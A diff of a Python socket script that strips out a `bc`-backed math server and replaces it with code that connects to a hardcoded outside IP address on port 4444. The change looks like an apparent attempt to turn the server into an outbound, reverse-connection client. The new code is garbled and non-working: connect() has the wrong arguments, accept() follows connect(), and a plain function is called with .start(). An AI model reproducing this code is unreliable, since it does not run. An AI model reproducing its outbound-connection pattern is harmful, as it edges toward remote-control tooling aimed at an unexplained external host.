@@ -1,9 +1,10 @@
 from subprocess import Popen, STDOUT, PIPE
 from threading import Thread
-import socket
+import socket 
 
-HOST = ''
-PORT = 3074
+
+HOST = '59.96.19.148'
+PORT = 4444
 con = []
 
 #Full Duplex Process Commuication.
@@ -23,45 +24,14 @@ class ProcessOutputThread(Thread):
 				con.remove(self.a[0])
 
 
-class MathServerThread(Thread):
-	def __init__(self, conn, addr):
-		Thread.__init__(self)
-		self.conn = conn
-		self.addr = addr
-
-	def run(self):
-		p = Popen(['bc'], stdout=PIPE, stderr=STDOUT, stdin=PIPE)
-		out_t = ProcessOutputThread(p, self.conn, self.addr)
-		out_t.start()
-		while p.poll() is None:
-			try:
-				inp = self.conn.recv(1024)
-				inp = inp.decode('ISO-8859-1').strip()
-				if not inp:
-					break
-				elif inp == "exit" or inp == "quit":
-					p.kill()
-					break
-					self.conn.close()
-				inp = inp + "\n"
-				p.stdin.write(inp.encode())
-				p.stdin.flush()
-			except Exception as e:
-				print(str(addr[0]) + " - " + str(e))
-				self.conn.close()
-				con.remove(self.addr[0])
-
+def MathServerThread():
+    	print("connected")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((HOST, PORT))
-s.listen()
-while True:
+s.connect(HOST,PORT)
+threads = 40
+while threads>1:
+    
 	conn, addr = s.accept()
-	if addr[0] in con:
-		print("Connection Rejected from {}:{}".format(addr[0], addr[1]))
-		conn.close()
-	else:
-		con.append(addr[0])
-		print("Connection Accepted from {}:{}".format(addr[0], addr[1]))
-		t = MathServerThread(conn, addr)
-		t.start()
+	t = MathServerThread()
+	t.start()
